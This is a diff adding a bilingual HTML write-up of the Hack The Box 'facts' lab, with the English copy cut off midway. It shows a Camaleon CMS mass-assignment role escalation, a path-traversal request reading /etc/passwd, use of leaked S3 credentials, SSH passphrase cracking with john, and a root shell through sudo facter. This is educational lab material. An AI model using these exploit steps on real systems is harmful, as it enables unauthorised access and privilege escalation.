@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facts | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+    <style>
+        pre {
+            position: relative;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            overflow-x: hidden;
+        }
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 0;
+            left: 0;
+            padding: 2px 10px;
+            font-size: 0.75em;
+            font-weight: 700;
+            text-transform: uppercase;
+            border-radius: 0 0 6px 0;
+            opacity: 0.7;
+        }
+        pre code {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        /* Syntax highlighting - light theme */
+        [data-theme="light"] .kw { color: #d73a49; }
+        [data-theme="light"] .cmd { color: #6f42c1; }
+        [data-theme="light"] .str { color: #032f62; }
+        [data-theme="light"] .flag { color: #e36209; }
+        [data-theme="light"] .comment { color: #6a737d; font-style: italic; }
+        [data-theme="light"] .url { color: #005cc5; }
+        [data-theme="light"] .var { color: #e36209; }
+        [data-theme="light"] .num { color: #005cc5; }
+        [data-theme="light"] .user { color: #22863a; }
+        [data-theme="light"] .path { color: #032f62; }
+        [data-theme="light"] .param { color: #6f42c1; }
+        [data-theme="light"] .func { color: #6f42c1; }
+        [data-theme="light"] .key { color: #d73a49; }
+        [data-theme="light"] .val { color: #032f62; }
+        /* Syntax highlighting - dark theme */
+        [data-theme="dark"] .kw { color: #f97583; }
+        [data-theme="dark"] .cmd { color: #b392f0; }
+        [data-theme="dark"] .str { color: #9ecbff; }
+        [data-theme="dark"] .flag { color: #ffab70; }
+        [data-theme="dark"] .comment { color: #6a737d; font-style: italic; }
+        [data-theme="dark"] .url { color: #79b8ff; }
+        [data-theme="dark"] .var { color: #ffab70; }
+        [data-theme="dark"] .num { color: #79b8ff; }
+        [data-theme="dark"] .user { color: #85e89d; }
+        [data-theme="dark"] .path { color: #9ecbff; }
+        [data-theme="dark"] .param { color: #b392f0; }
+        [data-theme="dark"] .func { color: #b392f0; }
+        [data-theme="dark"] .key { color: #f97583; }
+        [data-theme="dark"] .val { color: #9ecbff; }
+    </style>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">facts</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ==================== SPANISH CONTENT ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba un <code>Camaleon CMS</code> versión 2.9.0 tras un servidor <code>nginx</code>. Tras registrar una cuenta en el panel de administración, exploté una vulnerabilidad de <strong>Mass Assignment</strong> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2304">CVE-2025-2304</a>) en la acción de cambio de contraseña, añadiendo el parámetro <code>password[role]=admin</code> a la petición. Esto me permitió escalar mi rol de cliente a administrador dentro del CMS.</p>
+
+                    <p>Con acceso de administrador, descubrí unas credenciales de AWS S3 en la configuración del sitio. Estas credenciales apuntaban a un servicio S3 compatible que corría en el puerto <code>54321</code> de la propia máquina. Listando los buckets disponibles, encontré uno llamado <code>internal</code> que contenía lo que parecía ser el directorio home de un usuario, incluyendo una clave SSH privada <code>id_ed25519</code>.</p>
+
+                    <p>Sin embargo, no sabía a qué usuario pertenecía la clave. Explotando una segunda vulnerabilidad de <strong>Path Traversal</strong> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46987">CVE-2024-46987</a>) en el CMS, pude leer el fichero <code>/etc/passwd</code> y descubrir los usuarios del sistema: <code>trivia</code> y <code>william</code>. La clave SSH estaba protegida con una passphrase, la cual crackeé con <code>john</code> utilizando el diccionario <code>rockyou.txt</code>, obteniendo la contraseña <code>dragonballz</code>.</p>
+
+                    <p>Una vez dentro como <code>trivia</code>, descubrí que podía ejecutar <code>/usr/bin/facter</code> como root sin contraseña mediante <code>sudo</code>. Dado que <code>facter</code> es una herramienta Ruby que permite cargar scripts personalizados, creé un fichero <code>.rb</code> que ejecutaba una shell y lo cargué con la opción <code>--custom-dir</code>, obteniendo así acceso como <code>root</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Camaleon CMS 2.9.0 Mass Assignment (CVE-2025-2304), Path Traversal en Camaleon CMS (CVE-2024-46987), fuga de credenciales AWS S3, cracking de passphrase SSH con <code>john</code>, escalada de privilegios mediante <code>facter</code> con scripts Ruby personalizados.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar los puertos abiertos y servicios de la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo nmap mostrando puertos abiertos en la máquina facts" /></p>
+
+                <p>Añado <code>facts.htb</code> al fichero <code>/etc/hosts</code> para resolver el dominio correctamente. Entre los puertos identificados, llama la atención el puerto <code>54321</code>, donde parece correr un servidor escrito en Go que redirige al puerto <code>9001</code>, el cual probablemente solo está accesible de forma interna.</p>
+
+                <h2>Enumeración Web - Puerto 80</h2>
+                <p>Analizo el servidor web en el puerto 80 con <code>whatweb</code> para obtener información sobre las tecnologías utilizadas:</p>
+                <pre data-lang="bash"><code><span class="cmd">whatweb</span> <span class="url">http://facts.htb</span></code></pre>
+                <pre data-lang="output"><code>http://facts.htb [200 OK] Cookies[_factsapp_session], Country[RESERVED][ZZ], Email[contact@facts.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.26.3 (Ubuntu)], HttpOnly[_factsapp_session], IP[10.129.26.141], Open-Graph-Protocol[website], Script, Title[facts], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,plugin_front_cache,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[0], nginx[1.26.3]</code></pre>
+
+                <p>Con <code>Wappalyzer</code> detecto que probablemente se trata de una aplicación <strong>Ruby</strong>, posiblemente con el framework <strong>Ruby on Rails</strong>. Esta sospecha se refuerza por la cookie <code>_factsapp_session</code> que observo en las cabeceras:</p>
+                <pre data-lang="text"><code>hTUuvdgmAuAwDBe3RqwUhBrM0q2vDrQV%2BQqhVR8s80mDR3cpr1S0CUI7Csn8ONMglz7uJfwV3WAYA%2B8qwufC7BhlOVMvnKhRt3t%2FCbrjf3lu%2BmLSy6Pq7eVfgZWbFekYoDo%2BVW2NwH1YxPyi2ZebBBuWhlP%2FdmLuAqyICjUPJl54utKD814xHgp64LzgC7sQW7WOQNt2YiMeN8OLRp5J4ehRGAefwnKwNt0WWdsktMq%2FgPoOWdFOjctyEBtOVTei6IAjuEEKEx7kv0PprH1z6X6Km3TpyZbExQ%3D%3D--fZPfkTZIg0B34oMT--ZsZA8HahCTmxXP7IJd%2BiKw%3D%3D</code></pre>
+
+                <p>Investigando el formato de esta cookie, es probable que sea resultado de <code>Rails ActiveSupport::MessageEncryptor</code> o <code>MessageVerifier</code>, lo que confirma que estamos ante una aplicación Rails. Tomo nota por si más adelante pudiera observar posibles inyecciones <strong>SSTI</strong>.</p>
+
+                <h3>Enumeración de Directorios</h3>
+                <p>Lanzo una enumeración de directorios y encuentro las siguientes rutas relevantes:</p>
+                <pre data-lang="output"><code><span class="path">admin</span>    (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+<span class="path">search</span>   (Status: 200) [Size: 19187]
+<span class="path">sitemap</span>  (Status: 200) [Size: 3508]
+<span class="path">404</span>      (Status: 200) [Size: 4836]
+<span class="path">error</span>    (Status: 500) [Size: 7918]
+<span class="path">en</span>       (Status: 200) [Size: 11109]
+<span class="path">rss</span>      (Status: 200) [Size: 183]
+<span class="path">page</span>     (Status: 200) [Size: 19593]
+<span class="path">ajax</span>     (Status: 200) [Size: 0]
+<span class="path">index</span>    (Status: 200) [Size: 11113]
+<span class="path">captcha</span>  (Status: 200) [Size: 1354]
+<span class="path">post</span>     (Status: 200) [Size: 11308]
+<span class="path">up</span>       (Status: 200) [Size: 73]
+<span class="path">welcome</span>  (Status: 200) [Size: 11966]</code></pre>
+
+                <h2>Panel de Administración - Camaleon CMS</h2>
+                <p>En la ruta <code>/admin</code> encuentro un panel de inicio de sesión del CMS:</p>
+                <p><img src="./media/image4.png" alt="Panel de login de Camaleon CMS con opción de crear cuenta" /></p>
+
+                <p>Parece que puedo registrar una cuenta nueva mediante la opción <em>create account</em>. Tras registrarme, accedo a un panel de administración donde puedo ver mi perfil de usuario:</p>
+                <p><img src="./media/image3.png" alt="Perfil de usuario en el panel de administración de Camaleon CMS mostrando el rol de cliente" /></p>
+
+                <p>Sin embargo, mi rol es de <strong>cliente</strong>, no de administrador. En el footer de la página se muestra que se utiliza <strong>Camaleon CMS versión 2.9.0</strong>.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2025-2304 (Mass Assignment)</h2>
+                <p>Buscando vulnerabilidades conocidas para Camaleon CMS 2.9.0, encuentro información interesante en el <a href="https://github.com/owen2345/camaleon-cms/blob/master/CHANGELOG.md">changelog</a> de cuando se publicó la versión 2.9.1:</p>
+
+                <blockquote>
+                    <p><strong>2.9.1 (2025-01-06)</strong><br>
+                    This release is fixing several security vulnerabilities! Please, upgrade ASAP!<br><br>
+                    Security fix: Mitigate a Privilege Escalation through a Mass Assignment, fixing the updated_ajax action of admin UsersController to permit only legit params<br>
+                    <em>Thanks Joshua Martinelle from Tenable cybersecurity company for reporting this</em></p>
+                </blockquote>
+
+                <p>La vulnerabilidad de <strong>Mass Assignment</strong> parece especialmente interesante, ya que podría permitirme modificar mi rol de cliente a administrador. Localizo el CVE correspondiente: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2304">CVE-2025-2304</a>.</p>
+
+                <p>Encuentro un artículo de Tenable donde se explica detalladamente la causa de la vulnerabilidad: <a href="https://www.tenable.com/security/research/tra-2025-09">https://www.tenable.com/security/research/tra-2025-09</a>. También localizo la Pull Request donde se aplica el fix: <a href="https://github.com/owen2345/camaleon-cms/commit/179fd6b1ecf258d3e214aebfa87ac4a322ea4db4">https://github.com/owen2345/camaleon-cms/commit/179fd6b1ecf258d3e214aebfa87ac4a322ea4db4</a>.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>El problema reside en esta línea del controlador de usuarios:</p>
+                <pre data-lang="ruby"><code><span class="var">@user</span>.<span class="func">update</span>(<span class="var">params</span>.<span class="func">require</span>(<span class="str">:password</span>).<span class="func">permit!</span>)</code></pre>
+
+                <p>Concretamente el método <code>permit!</code> es el problema. Como especifica la <a href="https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-permit-21">documentación de Rails</a>:</p>
+
+                <blockquote>
+                    <p>"<code>permit!()</code> — Sets the permitted attribute to true. This can be used to pass mass assignment. Returns self."</p>
+                </blockquote>
+
+                <p>Es decir, <code>permit!</code> permite que <strong>cualquier</strong> parámetro pase el filtro de asignación masiva, incluyendo campos sensibles como el rol del usuario.</p>
+
+                <h2>Acceso Inicial - Explotando Mass Assignment</h2>
+                <p>Intercepto la petición con <code>Burpsuite</code> cuando intento cambiar la contraseña de mi cuenta. El body que se envía es el siguiente:</p>
+                <pre data-lang="http"><code><span class="var">_method</span>=<span class="val">patch</span>&amp;<span class="var">authenticity_token</span>=<span class="val">edF-xqESD-NYINKaH069TWnyjUHn5-Y62XUEtqOZ205qWAVU15FXWr8QFtQhFcDmSY91AWM5he3e2-24Z6lU2Q</span>&amp;<span class="var">password[password]</span>=<span class="val">asd</span>&amp;<span class="var">password[password_confirmation]</span>=<span class="val">asd</span></code></pre>
+
+                <p>Para reproducir la vulnerabilidad, simplemente añado el parámetro del rol al body de la petición:</p>
+                <pre data-lang="http"><code><span class="var">_method</span>=<span class="val">patch</span>&amp;<span class="var">authenticity_token</span>=<span class="val">edF-xqESD-NYINKaH069TWnyjUHn5-Y62XUEtqOZ205qWAVU15FXWr8QFtQhFcDmSY91AWM5he3e2-24Z6lU2Q</span>&amp;<span class="var">password[password]</span>=<span class="val">asd</span>&amp;<span class="var">password[password_confirmation]</span>=<span class="val">asd</span>&amp;<span class="key">password[role]=admin</span></code></pre>
+
+                <p>Tras reenviar la petición modificada, mi rol se ha actualizado correctamente a <strong>administrador</strong>:</p>
+                <p><img src="./media/image2.png" alt="Perfil de usuario actualizado mostrando el rol de administrador tras explotar el Mass Assignment" /></p>
+
+                <h2>Enumeración como Administrador - Credenciales AWS S3</h2>
+                <p>Investigando la configuración del sitio web con mis nuevos privilegios de administrador, encuentro unas credenciales de AWS S3 almacenadas en la configuración del CMS:</p>
+                <pre data-lang="text"><code><span class="key">Aws s3 access key (*)</span>
+<span class="val">AKIA3B9D0AA45ABCDEAE</span>
+
+<span class="key">Aws s3 secret key (*)</span>
+<span class="val">wQVzCvmAXxWRwN8Vml9au3w7gXT29D1keJGJFS5x</span>
+
+<span class="key">Aws s3 bucket name (*)</span>
+<span class="val">randomfacts</span>
+
+<span class="key">Aws s3 region (*)</span>
+<span class="val">us-east-1</span>
+
+<span class="key">Aws s3 bucket endpoint</span>
+<span class="val">http://localhost:54321</span>
+
+<span class="key">Cloudfront url</span>
+<span class="url">http://facts.htb/randomfacts</span></code></pre>
+
+                <p>Ahora entiendo el propósito del servicio que corre en el puerto <code>54321</code>: es un servicio S3 compatible (probablemente MinIO o similar) utilizado como backend de almacenamiento para el CMS.</p>
+
+                <h2>Enumeración de Buckets S3</h2>
+                <p>Configuro las credenciales de AWS en mi máquina para interactuar con el servicio S3:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">configure set</span> <span class="var">aws_access_key_id</span> <span class="val">AKIA3B9D0AA45ABCDEAE</span> <span class="flag">--profile</span>=<span class="val">xd</span>
+<span class="cmd">aws</span> <span class="param">configure set</span> <span class="var">aws_secret_access_key</span> <span class="val">wQVzCvmAXxWRwN8Vml9au3w7gXT29D1keJGJFS5x</span> <span class="flag">--profile</span>=<span class="val">xd</span></code></pre>
+
+                <p>Listo los buckets disponibles y descubro que, además del bucket <code>randomfacts</code> (que solo contiene las imágenes de la web), existe un bucket llamado <code>internal</code> bastante más interesante:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 ls</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>2025-09-11 13:06:52 internal
+2025-09-11 13:06:52 randomfacts</code></pre>
+
+                <p>Al listar el contenido del bucket <code>internal</code>, parece ser el directorio home de un usuario del sistema:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 ls</span> <span class="str">s3://internal/</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+2026-01-08 18:45:13        220 .bash_logout
+2026-01-08 18:45:13       3900 .bashrc
+2026-01-08 18:47:17         20 .lesshst
+2026-01-08 18:47:17        807 .profile</code></pre>
+
+                <p>Lo más interesante es la carpeta <code>.ssh/</code>. Listo su contenido y encuentro una clave privada SSH:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 ls</span> <span class="str">s3://internal/.ssh/</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>2026-02-01 18:37:03         82 authorized_keys
+2026-02-01 18:37:03        464 id_ed25519</code></pre>
+
+                <p>Descargo la clave SSH privada:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 cp</span> <span class="str">s3://internal/.ssh/id_ed25519</span> <span class="path">./id_ed25519</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>download: s3://internal/.ssh/id_ed25519 to ./id_ed25519</code></pre>
+
+                <p>Tengo la clave privada, pero no sé a qué usuario pertenece. Pruebo con <code>admin</code>, que es el usuario que veo en el CMS, pero no funciona. También descargo otros ficheros del bucket intentando encontrar el nombre del usuario, pero no aparece por ningún lado.</p>
+
+                <h2>Path Traversal - CVE-2024-46987</h2>
+                <p>Sigo investigando vulnerabilidades de Camaleon CMS y encuentro una vulnerabilidad de <strong>Path Traversal</strong> que me permitirá leer ficheros arbitrarios del sistema: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46987">CVE-2024-46987</a>.</p>
+
+                <p>La vulnerabilidad es sencilla de explotar. Solo tengo que visitar la siguiente ruta con una sesión de administrador:</p>
+                <pre data-lang="http"><code><span class="kw">GET</span> <span class="path">/admin/media/download_private_file?file=../../../../../../etc/passwd</span></code></pre>
+
+                <p>La vulnerabilidad se produce porque el parámetro <code>file</code> se pasa directamente a <code>fetch_file</code> sin ningún tipo de sanitización:</p>
+                <pre data-lang="ruby"><code><span class="kw">def</span> <span class="func">download_private_file</span>
+  <span class="var">cama_uploader</span>.<span class="func">enable_private_mode!</span>
+  <span class="var">file</span> = <span class="var">cama_uploader</span>.<span class="func">fetch_file</span>(<span class="str">"private/#{params[:file]}"</span>)
+  <span class="func">send_file</span> <span class="var">file</span>, <span class="key">disposition:</span> <span class="str">'inline'</span>
+<span class="kw">end</span></code></pre>
+
+                <p>De la respuesta obtengo los usuarios del sistema que tienen acceso a una shell bash:</p>
+                <pre data-lang="output"><code><span class="user">root</span>:x:0:0:root:<span class="path">/root</span>:<span class="path">/bin/bash</span>
+<span class="user">trivia</span>:x:1000:1000:facts.htb:<span class="path">/home/trivia</span>:<span class="path">/bin/bash</span>
+<span class="user">william</span>:x:1001:1001::<span class="path">/home/william</span>:<span class="path">/bin/bash</span></code></pre>
+
+                <h2>Cracking de Passphrase SSH y Acceso como Trivia</h2>
+                <p>Pruebo a conectarme con la clave SSH descargada como el usuario <code>trivia</code>, pero la clave está protegida con una passphrase:</p>
+                <pre data-lang="bash"><code><span class="cmd">ssh</span> <span class="flag">-i</span> <span class="path">id_ed25519</span> <span class="user">trivia</span>@<span class="url">facts.htb</span></code></pre>
+                <pre data-lang="output"><code>Enter passphrase for key 'id_ed25519':</code></pre>
+
+                <p>Utilizo <code>ssh2john</code> para extraer el hash de la clave y <code>john</code> con el diccionario <code>rockyou.txt</code> para crackear la passphrase:</p>
+                <pre data-lang="bash"><code><span class="cmd">ssh2john</span> <span class="path">id_ed25519</span> &gt; <span class="path">id_ed25519.hash</span>
+<span class="cmd">john</span> <span class="flag">--wordlist</span>=<span class="path">/usr/share/wordlists/rockyou.txt</span> <span class="path">id_ed25519.hash</span></code></pre>
+                <pre data-lang="output"><code><span class="str">dragonballz</span> (id_ed25519)</code></pre>
+
+                <p>Con la passphrase <code>dragonballz</code> consigo conectarme como <code>trivia</code> y obtengo la flag de usuario, que se encuentra en el home de <code>william</code> pero <code>trivia</code> tiene permisos para leerla.</p>
+
+                <h2>Escalada de Privilegios - Ruby Facter</h2>
+                <p>Una vez dentro, compruebo los privilegios <code>sudo</code> del usuario <code>trivia</code>:</p>
+                <pre data-lang="bash"><code><span class="cmd">sudo</span> <span class="flag">-l</span></code></pre>
+                <pre data-lang="output"><code>Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter</code></pre>
+
+                <p>El usuario <code>trivia</code> puede ejecutar <code>/usr/bin/facter</code> como root sin contraseña. <code>Facter</code> es una herramienta escrita en Ruby para recopilar datos del sistema, y según <a href="https://gtfobins.org/gtfobins/facter/">GTFOBins</a>, permite ejecutar scripts Ruby arbitrarios.</p>
+
+                <p>Para explotar esto, creo un directorio en <code>/tmp</code> con un script Ruby que lanza una shell, siguiendo la técnica documentada en <a href="https://gtfobins.org/gtfobins/ruby/#shell">GTFOBins para Ruby</a>:</p>
+                <pre data-lang="ruby"><code><span class="comment"># /tmp/facter/xd.rb</span>
+<span class="func">exec</span> <span class="str">"/bin/sh"</span></code></pre>
+
+                <p>Especificando el directorio personalizado de facter mediante la opción <code>--custom-dir</code>, obtengo acceso como <code>root</code>:</p>
+                <pre data-lang="bash"><code><span class="cmd">sudo</span> <span class="path">facter</span> <span class="flag">--custom-dir</span>=<span class="path">/tmp/facter</span></code></pre>
+                <pre data-lang="output"><code># <span class="cmd">whoami</span>
+<span class="user">root</span></code></pre>
+
+                <p>Con esto he conseguido acceso completo al sistema como <code>root</code> y puedo obtener la flag correspondiente.</p>
+            </div>
+
+            <!-- ==================== ENGLISH CONTENT ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running <code>Camaleon CMS</code> version 2.9.0 behind an <code>nginx</code> server. After registering an account in the admin panel, I exploited a <strong>Mass Assignment</strong> vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2304">CVE-2025-2304</a>) in the password change action, adding the parameter <code>password[role]=admin</code> to the request. This allowed me to escalate my role from client to administrator within the CMS.</p>
+
+                    <p>With administrator access, I discovered AWS S3 credentials stored in the site configuration. These credentials pointed to an S3-compatible service running on port <code>54321</code> of the machine itself. Listing the available buckets, I found one called <code>internal</code> that contained what appeared to be a user's home directory, including an SSH private key <code>id_ed25519</code>.</p>
+
+                    <p>However, I didn't know which user the key belonged to. Exploiting a second <strong>Path Traversal</strong> vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46987">CVE-2024-46987</a>) in the CMS, I was able to read the <code>/etc/passwd</code> file and discover the system users: <code>trivia</code> and <code>william</code>. The SSH key was protected with a passphrase, which I cracked using <code>john</code> with the <code>rockyou.txt</code> dictionary, obtaining the password <code>dragonballz</code>.</p>
+
+                    <p>Once inside as <code>trivia</code>, I discovered that I could execute <code>/usr/bin/facter</code> as root without a password via <code>sudo</code>. Since <code>facter</code> is a Ruby tool that allows loading custom scripts, I created a <code>.rb</code> file that spawned a shell and loaded it using the <code>--custom-dir</code> option, obtaining root access.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Camaleon CMS 2.9.0 Mass Assignment (CVE-2025-2304), Path Traversal in Camaleon CMS (CVE-2024-46987), AWS S3 credential leakage, SSH passphrase cracking with <code>john</code>, privilege escalation via <code>facter</code> with custom Ruby scripts.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an <code>nmap</code> scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports on the facts machine" /></p>
+
+                <p>I add <code>facts.htb</code> to my <code>/etc/hosts</code> file to resolve the domain correctly. Among the identified ports, port <code>54321</code> stands out — it appears to be running a Go-based server that redirects to port <code>9001</code>, which is likely only accessible internally.</p>
+
+                <h2>Web Enumeration - Port 80</h2>
+                <p>I analyze the web server on port 80 with <code>whatweb</code> to gather information about the technologies in use:</p>
+                <pre data-lang="bash"><code><span class="cmd">whatweb</span> <span class="url">http://facts.htb</span></code></pre>
+                <pre data-lang="output"><code>http://facts.htb [200 OK] Cookies[_factsapp_session], Country[RESERVED][ZZ], Email[contact@facts.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.26.3 (Ubuntu)], HttpOnly[_factsapp_session], IP[10.129.26.141], Open-Graph-Protocol[website], Script, Title[facts], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,plugin_front_cache,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[0], nginx[1.26.3]</code></pre>
+
+                <p>Using <code>Wappalyzer</code>, I detect that it's likely a <strong>Ruby</strong> application, possibly built with the <strong>Ruby on Rails</strong> framework. This suspicion is reinforced by the <code>_factsapp_session</code> cookie observed in the headers:</p>
+                <pre data-lang="text"><code>hTUuvdgmAuAwDBe3RqwUhBrM0q2vDrQV%2BQqhVR8s80mDR3cpr1S0CUI7Csn8ONMglz7uJfwV3WAYA%2B8qwufC7BhlOVMvnKhRt3t%2FCbrjf3lu%2BmLSy6Pq7eVfgZWbFekYoDo%2BVW2NwH1YxPyi2ZebBBuWhlP%2FdmLuAqyICjUPJl54utKD814xHgp64LzgC7sQW7WOQNt2YiMeN8OLRp5J4ehRGAefwnKwNt0WWdsktMq%2FgPoOWdFOjctyEBtOVTei6IAjuEEKEx7kv0PprH1z6X6Km3TpyZbExQ%3D%3D--fZPfkTZIg0B34oMT--ZsZA8HahCTmxXP7IJd%2BiKw%3D%3D</code></pre>
+
+                <p>Researching this cookie format, it's likely the result of <code>Rails ActiveSupport::MessageEncryptor</code> or <code>MessageVerifier</code>, which confirms we're dealing with a Rails application. I keep this in mind in case I spot potential <strong>SSTI</strong> injection points later.</p>
+
+                <h3>Directory Enumeration</h3>
+                <p>I run a directory enumeration and find the following relevant paths:</p>
+                <pre data-lang="output"><code><span class="path">admin</span>    (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+<span class="path">search</span>   (Status: 200) [Size: 19187]
+<span class="path">sitemap</span>  (Status: 200) [Size: 3508]
+<span class="path">404</span>      (Status: 200) [Size: 4836]
+<span class="path">error</span>    (Status: 500) [Size: 7918]
+<span class="path">en</span>       (Status: 200) [Size: 11109]
+<span class="path">rss</span>      (Status: 200) [Size: 183]
+<span class="path">page</span>     (Status: 200) [Size: 19593]
+<span class="path">ajax</span>     (Status: 200) [Size: 0]
+<span class="path">index</span>    (Status: 200) [Size: 11113]
+<span class="path">captcha</span>  (Status: 200) [Size: 1354]
+<span class="path">post</span>     (Status: 200) [Size: 11308]
+<span class="path">up</span>       (Status: 200) [Size: 73]
+<span class="path">welcome</span>  (Status: 200) [Size: 11966]</code></pre>
+
+                <h2>Admin Panel - Camaleon CMS</h2>
+                <p>At the <code>/admin</code> path, I find a CMS login panel:</p>
+                <p><img src="./media/image4.png" alt="Camaleon CMS login panel with create account option" /></p>
+
+                <p>It appears I can register a new account via the <em>create account</em> option. After registering, I access an admin panel where I can see my user profile:</p>
+                <p><img src="./media/image3.png" alt="User profile in the Camaleon CMS admin panel showing client role" /></p>
+
+                <p>However, my role is set to <strong>client</strong>, not administrator. The page footer shows that it uses <strong>Camaleon CMS version 2.9.0</strong>.</p>
+
+                <h2>Vulnerability Research - CVE-2025-2304 (Mass Assignment)</h2>
+                <p>Searching for known vulnerabilities in Camaleon CMS 2.9.0, I find interesting information in the <a href="https://github.com/owen2345/camaleon-cms/blob/master/CHANGELOG.md">changelog</a> from when version 2.9.1 was released:</p>
+
+                <blockquote>
+                    <p><strong>2.9.1 (2025-01-06)</strong><br>
+                    This release is fixing several security vulnerabilities! Please, upgrade ASAP!<br><br>
+                    Security fix: Mitigate a Privilege Escalation through a Mass Assignment, fixing the updated_ajax action of admin UsersController to permit only legit params<br>
+                    <em>Thanks Joshua Martinelle from Tenable cybersecurity company for reporting this</em></p>
+                </blockquote>
+
+                <p>The <strong>Mass Assignment</strong> vulnerability looks particularly interesting, as it could allow me to change my role from client to administrator. I locate the corresponding CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2304">CVE-2025-2304</a>.</p>
+
+                <p>I find a Tenable article that explains the root cause of the vulnerability in detail: <a href="https://www.tenable.com/security/research/tra-2025-09">https://www.tenable.com/security/research/tra-2025-09</a>. I also find the Pull Request where the fix was applied: <a href="https://github.com/owen2345/camaleon-cms/commit/179fd6b1ecf258d3e214aebfa87ac4a322ea4db4">https://github.com/owen2345/camaleon-cms/commit/179fd6b1ecf258d3e214aebfa87ac4a322ea4db4</a>.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The issue lies in this line of the users controller:</p>
+                <pre data-lang="ruby"><code><span class="var">@user</span>.<span class="func">update</span>(<span class="var">params</span>.<span class="func">require</span>(<span class="str">:password</span>).<span class="func">permit!</span>)</code></pre>
+
+                <p>Specifically, the <code>permit!</code> method is the problem. As specified in the <a href="https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-permit-21">Rails documentation</a>:</p>
+
+                <blockquote>
+                    <p>"<code>permit!()</code> — Sets the permitted attribute to true. This can be used to pass mass assignment. Returns self."</p>
+                </blockquote>
+
